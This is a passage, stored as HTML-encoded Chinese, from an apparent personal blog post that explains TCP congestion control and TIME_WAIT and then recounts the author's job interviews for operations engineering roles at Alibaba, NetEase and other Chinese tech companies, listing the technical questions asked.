&#x5728;&#x53D1;&#x9001;&#x65B9;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x201D;&#x63A5;&#x6536;&#x7A97;&#x53E3;&#x201D;,&#x53D1;&#x9001;&#x7AEF;&#x7684;&#x53D1;&#x9001;&#x7A97;&#x53E3;&#x4E0A;&#x9650;&#x503C;&#x5E94;&#x53D6;&#x201C;&#x63A5;&#x6536;&#x65B9;&#x7A97;&#x53E3;&#x201D;&#x548C;&#x201C;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x201D;&#x4E2D;&#x8F83;&#x5C0F;&#x7684;&#x4E00;&#x4E2A;&#xFF0C;&#x524D;&#x8005;&#x662F;&#x6765;&#x81EA;&#x63A5;&#x6536;&#x65B9;&#x7684;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#xFF0C;&#x540E;&#x8005;&#x662F;&#x6765;&#x81EA;&#x53D1;&#x9001;&#x65B9;&#x7684;&#x6D41;&#x91CF;&#x63A7;&#x5236;&#x3002;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5728;&#x8FD0;&#x8F93;&#x5C42;&#x8FDB;&#x884C;&#x62E5;&#x585E;&#x63A7;&#x5236;&#xFF0C;&#x56E0;&#x7279;&#x7F51;&#x5B9A;&#x4E49;&#x4E86; 4 &#x79CD;&#x7B97;&#x6CD5;&#xFF0C;&#x5373;&#x6162;&#x542F;&#x52A8;&#xFF0C;&#x62E5;&#x585E;&#x907F;&#x514D;&#xFF0C;&#x5FEB;&#x91CD;&#x4F20;&#xFF0C;&#x5FEB;&#x6062;&#x590D;&#x3002; &#x6162;&#x542F;&#x52A8;&#x9636;&#x6BB5;&#xFF0C;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x4ECE; 0 &#x5F00;&#x59CB;&#x4EE5;&#x6307;&#x6570;&#x65B9;&#x5F0F;&#x5FEB;&#x901F;&#x589E;&#x52A0;&#xFF0C;&#x76F4;&#x5230;&#x8FBE;&#x5230;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x7684;&#x95E8;&#x9650;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x6267;&#x884C;&#x62E5;&#x585E;&#x907F;&#x514D;&#xFF0C;&#x5373;&#x62E5;&#x585E;&#x7A97;&#x53E3;&#x4EE5;&#x7EBF;&#x6027;&#x901F;&#x5EA6;&#x589E;&#x52A0;&#x3002;tcp &#x72B6;&#x6001; time_wait &#x7684;&#x4F5C;&#x7528; TIME_WAIT &#x662F;&#x4E3A;&#x4E86;&#x5B9E;&#x73B0; TCP &#x5168;&#x53CC;&#x5DE5;&#x8FDE;&#x63A5;&#x7684;&#x53EF;&#x9760;&#x6027;&#x5173;&#x95ED;&#xFF0C;&#x7528;&#x6765;&#x91CD;&#x53D1;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x7684; ACK &#x62A5;&#x6587;&#xFF1B;&#x9700;&#x8981;&#x6301;&#x7EED;2&#x4E2A;MSL(&#x6700;&#x5927;&#x62A5;&#x6587;&#x751F;&#x5B58;&#x65F6;&#x95F4;)&#xFF1A;&#x5047;&#x8BBE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7AEF;&#x53E3;&#x5728;&#x8FDB;&#x5165;TIME_WAIT&#x540E;&#xFF0C;2&#x4E2A; MSL&#x65F6;&#x95F4;&#x5185;&#x5E76;&#x6CA1;&#x6709;&#x6536;&#x5230;FIN,&#x8BF4;&#x660E;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x6700;&#x540E;&#x53D1;&#x51FA;&#x7684;ACK&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;&#xFF1B;&#x5426;&#x5219;&#xFF0C;&#x4F1A;&#x5728;2&#x4E2A;MSL&#x5185;&#x518D;&#x6B21;&#x6536;&#x5230;ACK.&#x56DE;&#x9000;N&#x5E27;&#x534F;&#x8BAE;/&#x6ED1;&#x52A8;&#x7A97;&#x53E3;python&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF0C;&#x6211;&#x535A;&#x5BA2;&#x505A;&#x4E86;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x6211;&#x7684;&#x535A;&#x5BA2;&#x963F;&#x91CC;&#x5B9E;&#x4E60;&#x65F6;&#x81EA;&#x5DF1;&#x5185;&#x63A8;&#x4E86;&#x7CFB;&#x7EDF;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x672C;&#x6765;&#x662F;&#x7B80;&#x5386;&#x90FD;&#x6CA1;&#x8FC7;&#xFF0C;&#x5927;&#x795E;&#x534E;&#x54E5;&#x5E2E;&#x6211;&#x590D;&#x6D3B;&#xFF0C;&#x9762;&#x4E86;7&#x9762;&#xFF0C;&#x6211;&#x90FD;&#x4E0D;&#x77E5;&#x9053;&#x9762;&#x4E86;&#x4E9B;&#x4EC0;&#x4E48;&#x3002; &#x79CB;&#x62DB;&#x5386;&#x7A0B;&#x963F;&#x91CC;&#x5185;&#x63A8;&#x6302; &#x963F;&#x91CC;&#x6821;&#x62DB;java&#x5F00;&#x53D1; &#x7F51;&#x6613;&#x5185;&#x63A8; &#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08; &#xFF08;&#x4E00;&#x9762;-&gt;&#x4E8C;&#x9762;-&gt;&#x603B;&#x76D1;&#x9762;-&gt;hr&#x6302;&#xFF09; &#x817E;&#x8BAF;&#xFF08;&#x5185;&#x63A8;&#x6CA1;&#x7406;&#x6211;&#xFF0C;&#x6821;&#x62DB;&#x4E00;&#x9762;&#x6302;&#xFF09; &#x7F8E;&#x56E2;&#xFF08;&#x4E00;&#x9762;-&gt;&#x4E8C;&#x9762;-&gt;&#x4E09;&#x9762;-&gt;hr&#x6302;&#xFF09; &#x767E;&#x5EA6;&#xFF08;&#x56E0;&#x4E3A;&#x7F8E;&#x56E2;&#x9762;&#x8BD5;&#x803D;&#x8BEF;&#x592A;&#x591A;&#x65F6;&#x95F4;&#xFF0C;&#x9519;&#x8FC7;&#x4E86;&#x9762;&#x8BD5;&#xFF0C;&#x4F46;&#x6700;&#x540E;&#x53C8;&#x53BB;&#x9762;&#x8BD5;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x7ED9;&#x4E86;&#x4E2A;&#x673A;&#x4F1A;&#xFF0C;&#x4E09;&#x9762;&#x6302; &#xFF09; &#x641C;&#x72D7;&#xFF08;&#x7F8E;&#x56E2;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x6CA1;&#x6709;&#x53BB;&#x9762;&#x8BD5;&#xFF0C;&#x5F88;&#x9057;&#x61BE;&#xFF09; &#x5FAE;&#x5E97;&#x63D0;&#x524D;&#x6279; &#x8FD0;&#x7EF4;&#x7814;&#x53D1; &#x8611;&#x83C7;&#x8857; &#xFF08;&#x7B80;&#x5386;&#x7B5B;&#x9009;&#x672A;&#x8FC7;&#xFF09; &#x7F51;&#x6613;&#x6E38;&#x620F;&#x4E92;&#x52A8;&#x5A31;&#x4E50;&#xFF08;&#x7B2C;&#x4E00;&#x6B21;&#x9762;&#x8BD5;&#x6B62;&#x6B65;&#x4E8C;&#x9762;&#xFF09; &#x65B0;&#x6D6A;&#x793E;&#x62DB;/&#x65B0;&#x6D6A;&#x5FAE;&#x535A; &#x7F51;&#x6613;&#x5317;&#x4EAC; &#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#xFF08;offer&#xFF0C;&#x5F52;&#x5C5E;&#xFF09; &#x8FD8;&#x6709;&#x5176;&#x5B83;&#x7684;4399&#xFF0C;&#x5B8C;&#x7F8E;&#x4E16;&#x754C;&#x4E4B;&#x7C7B; &#x7B14;&#x8BD5;&#x7B14;&#x8BD5;&#x7F51;&#x7AD9;&#x76EE;&#x524D;&#x5C31;&#x51E0;&#x5BB6;&#x5427;:&#x725B;&#x5BA2;&#x7F51;,&#x8D5B;&#x7801;&#x7F51;,ceping,amact,&#x524D;&#x9762;2&#x4E2A;&#x7F51;&#x7AD9;&#x7F16;&#x7A0B;&#x9898;&#x53EF;&#x4EE5;&#x8DF3;&#x51FA;,&#x540E;&#x9762;&#x51E0;&#x4E2A;&#x90FD;&#x4E0D;&#x80FD;. &#x767E;&#x5EA6;:&#x4E00;&#x822C;&#x7528;&#x7684;&#x662F;&#x8D5B;&#x7801;&#x7F51;&#x548C;amact&#xFF0C;&#x7F16;&#x7A0B;&#x9898;&#x90FD;&#x4E0D;&#x80FD;&#x8DF3;&#x51FA; &#x963F;&#x91CC;&#x5DF4;&#x5DF4;:&#x7528;&#x7684;&#x662F;&#x81EA;&#x5DF1;&#x7814;&#x53D1;&#x7684;&#x7B14;&#x8BD5;&#x7F51;&#x7AD9;,&#x4E00;&#x822C;&#x662F;20&#x4E2A;&#x9009;&#x62E9;&#x9898;(&#x6570;&#x5B66;&#x9898;&#x548C;&#x667A;&#x529B;&#x9898;&#x5C45;&#x591A;),3&#x9053;&#x9644;&#x52A0;&#x9898;(&#x5F88;&#x96BE;)&#xFF0C;&#x53CD;&#x6B63;&#x5C31;&#x662F;&#x5199;&#x4E00;&#x5927;&#x5806;&#x3002; &#x817E;&#x8BAF;:&#x4E00;&#x76F4;&#x90FD;&#x7528;&#x7684;&#x662F;ceping&#x7F51;,30&#x9053;&#x9009;&#x62E9;&#x9898;,&#x7136;&#x540E;&#x51E0;&#x9053;&#x8BBA;&#x8FF0;&#x9898;,&#x4E00;&#x822C;&#x90FD;&#x662F;&#x67B6;&#x6784;. &#x7F51;&#x6613;&#xFF1A;&#x725B;&#x5BA2;&#x7F51;&#xFF0C;&#x5185;&#x63A8;&#x65F6;&#x51FA;&#x4E86;&#x5C0F;&#x95EE;&#x9898;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x597D;&#xFF0C;&#x4F9D;&#x7136;&#x8FC7;&#x4E86;&#x7B14;&#x8BD5;&#xFF0C;&#x6821;&#x62DB;&#x9009;&#x62E9;&#x4E86;&#x7F51;&#x6613;&#x653E;&#x5F03;&#x4E86;&#x5C0F;&#x7C73;&#x3002; &#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF1A;&#x4E92;&#x52A8;&#x5A31;&#x4E50;&#x51FA;&#x7684;&#x6700;&#x6B63;&#x5B97;&#x7684;&#x8FD0;&#x7EF4;&#x7B14;&#x8BD5;&#x9898;&#xFF0C;&#x5F88;&#x7ED9;&#x529B;&#xFF0C;&#x9898;&#x91CF;&#x5927;&#x3002; &#x5FAE;&#x8F6F;&#x4E2D;&#x56FD;&#xFF1A;&#x8FD8;&#x662F;&#x5F88;&#x96BE;&#xFF0C;&#x540C;&#x6837;&#x7F16;&#x7A0B;&#x3002; &#x534E;&#x4E3A;:&#x673A;&#x8BD5;&#x597D;&#x50CF;&#x662F;3&#x9053;&#x7F16;&#x7A0B;&#x9898;. google&#xFF0C;google&#x662F;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x6D4B;&#x8BC4;&#xFF0C;&#x9898;&#x8FD8;&#x662F;&#x5F88;&#x96BE;&#x3002;&#x9762;&#x8BD5;&#x82F1;&#x6587;&#xFF0C;&#x538B;&#x529B;&#x5927;&#x3002; &#x5176;&#x4F59;&#x7684;&#x516C;&#x53F8;:&#x7EBF;&#x4E0A;&#x6216;&#x8005;&#x7EBF;&#x4E0B;&#x7B14;&#x8BD5;&#xFF08;&#x7B14;&#x8BD5;&#x9898;&#x4E2D;C/C &#x504F;&#x591A;&#xFF09; &#x9762;&#x8BD5;&#x8BF4;&#x51E0;&#x4E2A;&#x81EA;&#x5DF1;&#x89C9;&#x5F97;&#x91CD;&#x8981;&#x7684;&#x5427; &#x963F;&#x91CC;&#x5185;&#x63A8; &#x963F;&#x91CC;&#x662F;&#x4E00;&#x4E2A;&#x5F88;&#x770B;&#x91CD;&#x57FA;&#x7840;&#x7684;&#x516C;&#x53F8;&#xFF0C;&#x8981;&#x6C42;&#x5F88;&#x591A;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x5F88;nice&#xFF0C;&#x4E5F;&#x662F;&#x81EA;&#x5DF1;&#x4ECE;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#x5C31;&#x53BB;&#x9762;&#x8BD5;&#x7684;&#x4E00;&#x5BB6;&#x516C;&#x53F8;&#xFF0C;&#x4E4B;&#x524D;&#x5B9E;&#x4E60;&#x4E5F;&#x53BB;&#x9762;&#x8FC7;&#xFF0C;&#x6821;&#x62DB;&#x9762;&#x7684;cdn&#x90E8;&#x95E8;&#xFF0C;&#x5404;&#x79CD;&#x7F51;&#x7EDC;&#x95EE;&#x9898;&#xFF0C;&#x4EE5;&#x53CA;&#x6709;&#x5173;cdn&#x7684;&#x95EE;&#x9898;&#x3002; &#x4E00;&#x9762;&#x662F;&#x5728;&#x81EA;&#x5DF1;&#x53C2;&#x52A0;&#x5B8C;&#x7F51;&#x6613;&#x5317;&#x4EAC;&#x5185;&#x63A8;&#x9762;&#x8BD5;&#x56DE;&#x5317;&#x4EAC;&#x7684;&#x8DEF;&#x4E0A;&#xFF0C;&#x81EA;&#x5DF1;&#x627E;&#x4E86;&#x4E2A;&#x89D2;&#x843D;&#xFF0C;&#x9762;&#x4E86;20&#x5206;&#x949F;&#xFF0C;&#x7136;&#x540E;&#x8BF4;&#x4E8C;&#x9762;&#x4F1A;&#x6709;&#x540E;&#x7EED;&#x901A;&#x77E5;&#xFF0C;&#x6CA1;&#x6709;&#x7136;&#x540E;&#x4E86;&#x3002; &#x6821;&#x62DB; &#x4E00;&#x9762;&#xFF1A; &#x9762;&#x8BD5;&#x5B98;&#x5F88;&#x4E25;&#x5389;&#xFF0C;&#x5168;&#x7A0B;&#x4E0D;&#x600E;&#x4E48;&#x8BF4;&#x8BDD;&#xFF0C;&#x6211;&#x5C31;&#x4E00;&#x76F4;&#x5199;&#x4EE3;&#x7801;&#x3002;&#x4ECE;&#x6700;&#x7B80;&#x5355;&#x7684;&#x94FE;&#x8868;&#x9006;&#x7F6E;&#x5230;&#x4E8C;&#x53C9;&#x6811;&#xFF0C;&#x5B57;&#x7B26;&#x4E32;&#x5339;&#x914D;&#x7B97;&#x6CD5;&#x3002;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x95EE;&#x4E86;python&#xFF0C;java&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF0C;&#x65B0;&#x751F;&#x4EE3;&#x4EC0;&#x4E48;&#xFF0C;&#x753B;&#x56FE;&#x7ED9;&#x9762;&#x8BD5;&#x5B98;&#x770B;&#x4E86;&#xFF0C;jvm&#x7684;&#x4E00;&#x4E9B;&#xFF08;&#x63D0;&#x524D;&#x770B;&#x4E86;&#x9762;&#x7ECF;&#xFF0C;&#x8868;&#x73B0;&#x7684;&#x4F1A;&#x597D;&#x4E00;&#x70B9;&#xFF09;&#x3002;&#x5230;&#x4E86;&#x6700;&#x540E;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x624D;&#x8868;&#x73B0;&#x7B11;&#x5BB9;&#xFF0C;&#x8BA9;&#x6211;&#x7B49;&#x540E;&#x7EED;&#x901A;&#x77E5;&#x3002; &#x4E8C;&#x9762;&#xFF1A; &#x4E8C;&#x9762;&#x9762;&#x8BD5;&#x5B98;&#x5F88;&#x548C;&#x853C;&#xFF0C;&#x95EE;&#x4E86;&#x4E0B;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x9879;&#x76EE;&#xFF0C;&#x57FA;&#x4E8E;python&#x7684;&#x65E5;&#x5FD7;&#x5206;&#x6790;&#x5DE5;&#x5177;&#xFF0C;&#x95EE;&#x4E86;&#x4E0B;hadoop&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;HDFS&#xFF0C;mapreduce&#x7684;&#x4E00;&#x4E9B;&#x3002;&#x4F5C;&#x4E1A;&#x63D0;&#x4EA4;&#xFF08;&#x57FA;&#x4E8E;java API&#xFF0C;streaming&#xFF0C;pipes&#xFF09;&#xFF0C;&#x753B;&#x4E86;&#x4E0B;hadoop&#x7684;&#x67B6;&#x6784;&#xFF0C;&#x6700;&#x540E;&#x8868;&#x793A;&#x81EA;&#x5DF1;&#x5BF9;&#x8FD0;&#x7EF4;&#x6BD4;&#x8F83;&#x719F;&#x6089;&#xFF0C;&#x5BF9;&#x5F00;&#x53D1;&#x8FD9;&#x5757;&#x6BD4;&#x8F83;&#x5F31;&#x3002;&#x7136;&#x540E;&#x9762;&#x8BD5;&#x5B98;&#x95EE;&#x4E86;&#x4E0B;linux&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;&#x3002; &#x4E09;&#x9762;&#xFF1A;&#x95EE;&#x4E86;&#x9879;&#x76EE;&#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x4EE5;&#x53CA;linux&#xFF0C;&#x8FD8;&#x6709;c/c &#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x7B97;&#x6CD5;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x7B11;&#x95EE;&#x6211;&#xFF0C;&#x4E0D;&#x662F;&#x64C5;&#x957F;python&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x5199;&#x7B97;&#x6CD5;&#x9898;&#x7528;c,&#x5F53;&#x65F6;&#x56DE;&#x7B54;&#x4E86;&#x81EA;&#x5DF1;&#x611F;&#x89C9;&#x597D;&#x628A;&#x63E1;&#xFF0C;&#x597D;&#x8868;&#x793A;&#x3002; hr&#x9762;&#xFF1A;&#x67E5;&#x6237;&#x53E3; &#x8FC7;&#x4E86;&#x4E24;&#x5468;&#x7ED9;&#x4E86;&#x53E3;&#x5934;offer&#xFF0C;&#x6CA1;&#x6709;&#x7136;&#x540E;&#x4E86;&#x3002; &#x7F51;&#x6613;&#x5185;&#x63A8; &#x7F51;&#x6613;&#x5185;&#x63A8;&#x4EBA;&#x597D;&#x5C11;&#xFF0C;&#x53BB;&#x5317;&#x4EAC;&#x9762;&#x8BD5;&#x7684;&#x53EA;&#x6709;&#x51E0;&#x4E2A;&#xFF0C;&#x5F53;&#x65F6;&#x53BB;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x522B;&#x597D;&#x7684;hr&#x3002;&#x7136;&#x540E;&#x7ED9;&#x6211;&#x5B89;&#x6392;&#x9762;&#x8BD5;&#x3002; &#x4E00;&#x9762;&#xFF1A; python&#x591A;&#x7EBF;&#x7A0B;&#xFF08;threading/thread&#xFF09;&#xFF0C;lvs&#x56DB;&#x79CD;&#x5DE5;&#x4F5C;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5404;&#x79CD;&#x95EE;&#xFF0C;nat&#x6A21;&#x5F0F;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#xFF0C;dr&#x6A21;&#x5F0F;&#x600E;&#x4E48;&#x7981;&#x6B62;arp&#xFF0C;&#x7981;&#x7528;arp&#x540E;&#xFF0C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x600E;&#x4E48;&#x627E;&#x5230;&#x540E;&#x7AEF;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;mac&#xFF0C;&#x5982;&#x679C;&#x4E2D;&#x95F4;&#x6709;&#x8DEF;&#x7531;&#xFF0C;&#x6709;&#x4EA4;&#x6362;&#x673A;&#xFF0C;&#x600E;&#x4E48;&#x627E;&#xFF08;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7981;&#x7528;&#x7684;&#x662F;lo&#x7684;arp&#x54CD;&#x5E94;&#xFF0C;vip&#x4E5F;&#x662F;&#x7ED1;&#x5B9A;&#x5728;lo&#x4E0A;&#xFF0C;&#x4F46;&#x6709;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7684;ip&#xFF09;; python&#x8C03;&#x7528;shell&#x547D;&#x4EE4;,&#x4E4B;&#x95F4;&#x65B9;&#x6CD5;&#x6709;&#x4EC0;&#x4E48;&#x4E0D;&#x540C;&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x8FD4;&#x56DE;&#x503C;&#x3002;ssh&#x7684;&#x539F;&#x7406;&#x3002;&#x5BF9;&#x865A;&#x62DF;&#x5316;&#x7684;&#x4E86;&#x89E3;&#xFF0C;kvm/xen&#x3002;iptables&#x89C4;&#x5219;&#x7684;&#x4E66;&#x5199;&#xFF1B;&#x81EA;&#x5DF1;&#x7684;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x9879;&#x76EE;&#x7684;&#x76F8;&#x5173;&#x95EE;&#x9898;&#xFF0C;&#x7EDF;&#x8BA1;nginx&#x65E5;&#x5FD7;&#x51FA;&#x73B0;&#x6B21;&#x6570;&#x6700;&#x591A;&#x7684;ip&#xFF0C;awk&#x641E;&#x5B9A;&#xFF0C;&#x6700;&#x540E;&#x53C8;&#x4F5C;&#x6B7B;&#x8BF4;&#x4E86;hadoop&#x7684;nginx&#x65E5;&#x5FD7;&#x5206;&#x6790;&#xFF0C;&#x9762;&#x8BD5;&#x5B98;&#x8BA9;&#x6211;&#x4ECB;&#x7ECD;&#x4E0B;hadoop&#xFF0C;&#x5DEE;&#x70B9;&#x6302;&#x4E86;&#x3002; &#x4E8C;&#x9762;&#xFF1A; &#x5199;&#x4E8C;&#x5206;&#x67E5;&#x627E;&#xFF0C;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#xFF0C;&#x7ED9;&#x9762;&#x8BD5;&#x5B98;&#x8BB2;&#x5E38;&#x89C1;&#x7684;&#x6392;&#x5E8F;&#x601D;&#x60F3;&#xFF0C;&#x753B;&#x56FE;&#xFF1B;python&#x7684;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF0C;&#x548C;C/C &#x6709;&#x4EC0;&#x4E48;&#x4E0D;&#x540C;&#xFF0C;python&#x6709;&#x56DE;&#x6536;&#x673A;&#x5236;&#xFF0C;C/C &#x624B;&#x52A8;&#x56DE;&#x6536;&#xFF08;malloc/free new/delete&#xFF09;&#x3002;&#x95EE;&#x7528;&#x8FC7;&#x4EC0;&#x4E48;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#xFF0C;puppet/ansible/saltstack&#x2026;;&#x53C8;&#x95EE;&#x6709;&#x4EC0;&#x4E48;&#x533A;&#x522B;&#xFF0C;&#x7B54;&#x7684;&#x5F88;&#x5DEE;&#xFF0C;&#x5C31;&#x662F;&#x7B54;&#x4E86;c/s&#x67B6;&#x6784;&#xFF0C;ssh&#x548C;&#x6D88;&#x606F;&#x961F;&#x5217;&#x3002;&#x7B49;&#x4FAF;&#x4E09;&#x9762;&#x3002; &#x4E2D;&#x95F4;hr&#x7ED9;&#x4E86;&#x4E2A;&#x996D;&#x7968;&#xFF0C;&#x53BB;&#x7F51;&#x6613;&#x5403;&#x4E86;&#x4E2A;&#x996D;&#x3002; &#x4E09;&#x9762;&#xFF1A;&#x4EE5;&#x4E3A;&#x4E09;&#x9762;&#x5C31;&#x662F;hr&#x9762;&#xFF0C;&#x7ED3;&#x679C;&#x52A0;&#x4E86;&#x4E00;&#x9762;&#x3002;&#x7EE7;&#x7EED;&#x6280;&#x672F;&#x9762;&#xFF0C;&#x95EE;&#x4E86;docker&#xFF0C;openstack&#xFF0C;&#x65E5;&#x5FD7;&#x5904;&#x7406;ELK&#x7684;&#x539F;&#x7406;&#x673A;&#x5236;&#x3002;&#x4E4B;&#x540E;&#x5C31;&#x662F;&#x95EE;&#x5BB6;&#x5EAD;&#x60C5;&#x51B5;&#xFF0C;&#x613F;&#x4E0D;&#x613F;&#x610F;&#x6765;&#x5317;&#x4EAC;&#xFF0C;&#x5E73;&#x65F6;&#x559C;&#x6B22;&#x770B;&#x4EC0;&#x4E48;&#x4E66;&#x3002; hr&#x9762;&#xFF1A; &#x5BB6;&#x5EAD;&#x60C5;&#x51B5;&#xFF0C;&#x5DE5;&#x4F5C;&#x5730;&#x70B9;&#x8981;&#x6C42;&#xFF0C;&#x60F3;&#x6210;&#x4E3A;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x4EBA;&#xFF0C;&#x5B66;&#x4E60;&#x8BA1;&#x5212;&#xFF0C;&#x85AA;&#x8D44;&#x8981;&#x6C42;&#xFF08;&#x8981;&#x4E86;8000&#xFF09; &#x4E4B;&#x540E;&#x7B49;&#x901A;&#x77E5;&#xFF0C;G20&#x8FC7;&#x540E;&#xFF0C;&#x7B49;&#x6765;&#x62D2;&#x4FE1;&#x3002; &#x6821;&#x62DB; &#x6821;&#x62DB;&#x65F6;&#x81EA;&#x5DF1;&#x6295;&#x4E86;&#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#x5C97;&#xFF0C;&#x653E;&#x5F03;&#x5C0F;&#x7C73;&#x7B14;&#x8BD5;&#xFF0C;&#x641E;&#x4E86;&#x7F51;&#x6613;&#x5317;&#x4EAC;&#x7684;&#x8FD0;&#x7EF4;&#x7814;&#x53D1;&#x7B14;&#x8BD5;&#x9898;&#x3002;&#x4E4B;&#x540E;&#x901A;&#x77E5;&#x53BB;&#x9762;&#x8BD5;&#xFF0C;&#x4F46;&#x7F51;&#x6613;&#x6E38;&#x620F;&#x7684;&#x673A;&#x7968;&#x4E5F;&#x5728;&#x90A3;&#x4E00;&#x5929;&#xFF0C;&#x5C31;&#x548C;hr&#x6C9F;&#x901A;&#x8FC7;&#x540E;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x53BB;&#x9762;&#x8BD5;&#x3002;&#x65E9;&#x4E0A;&#x9762;&#x5B8C;&#x7F51;&#x6613;&#x6E38;&#x620F;&#xFF0C;&#x4E2D;&#x5348;&#x8D76;&#x7D27;&#x53BB;&#x7F51;&#x6613;&#x9762;&#x8BD5;&#x3002;&#x8D76;&#x5230;&#x7F51;&#x6613;&#x65F6;&#xFF0C;2&#x70B9;&#xFF0C;&#x7B7E;&#x5230;&#x4E4B;&#x540E;&#x7B49;&#x5F85;&#xFF0C;&#x7B49;&#x5230;&#x4E0B;&#x5348;&#x5FEB;5&#x70B9;&#x65F6;&#xFF0C;&#x7EC8;&#x4E8E;&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x9762;&#x8BD5;&#x4E86;&#x3002; &#x4E00;&#x9762;&#xFF1A; &#x9762;&#x8BD5;&#x5B98;&#x662F;&#x6211;&#x4E8C;&#x9762;&#x9762;&#x8BD5;&#x5B98;&#xFF0C;&#x6CA1;&#x6709;&#x81EA;&#x6211;&#x4ECB;&#x7ECD;&#xFF0C;&#x95EE;linux&#x547D;&#x4EE4;&#xFF0C;&#x95EE;&#x7F51;&#x7EDC;&#xFF1B;&#x56DE;&#x7B54;nginx&#x7684;&#x60CA;&#x7FA4;&#x95EE;&#x9898;&#xFF0C;&#xFF08;&#x591A;&#x7EBF;&#x7A0B;/&#x591A;&#x8FDB;&#x7A0B;&#xFF08;Linux&#x4E0B;&#x7EBF;&#x7A0B;&#x8FDB;&#x7A0B;&#x4E5F;&#x6CA1;&#x591A;&#x5927;&#x533A;&#x522B;&#xFF09;&#x7B49;&#x5F85;&#x540C;&#x4E00;&#x4E2A;socket&#x4E8B;&#x4EF6;&#xFF0C;&#x5F53;&#x8FD9;&#x4E2A;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x8FD9;&#x4E9B;&#x7EBF;&#x7A0B;/&#x8FDB;&#x7A0B;&#x88AB;&#x540C;&#x65F6;&#x5524;&#x9192;&#xFF0C;&#x5C31;&#x662F;&#x60CA;&#x7FA4;&#x3002;&#x8BB8;&#x591A;&#x8FDB;&#x7A0B;&#x88AB;&#x5185;&#x6838;&#x91CD;&#x65B0;&#x8C03;&#x5EA6;&#x5524;&#x9192;&#xFF0C;&#x540C;&#x65F6;&#x53BB;&#x54CD;&#x5E94;&#x8FD9;&#x4E00;&#x4E2A;&#x4E8B;&#x4EF6;&#xFF0C;&#x5F53;&#x7136;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x80FD;&#x5904;&#x7406;&#x4E8B;&#x4EF6;&#x6210;&#x529F;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x8FDB;&#x7A0B;&#x5728;&#x5904;&#x7406;&#x8BE5;&#x4E8B;&#x4EF6;&#x5931;&#x8D25;&#x540E;&#x91CD;&#x65B0;&#x4F11;&#x7720;&#x3002;&#x8FD9;&#x79CD;&#x6027;&#x80FD;&#x6D6A;&#x8D39;&#x73B0;&#x8C61;&#x5C31;&#x662F;&#x60CA;&#x7FA4;&#x3002;&#xFF09;&#xFF1B;&#x5982;&#x4F55;&#x89E3;&#x60CA;&#x7FA4;&#x95EE;&#x9898;&#xFF1B;&#x56DE;&#x7B54;&#xFF08;&#x9501;&#xFF0C;&#x7EA2;&#x9ED1;&#x6811;&#xFF0C;&#x5B9A;&#x65F6;&#x5668;&#xFF09; 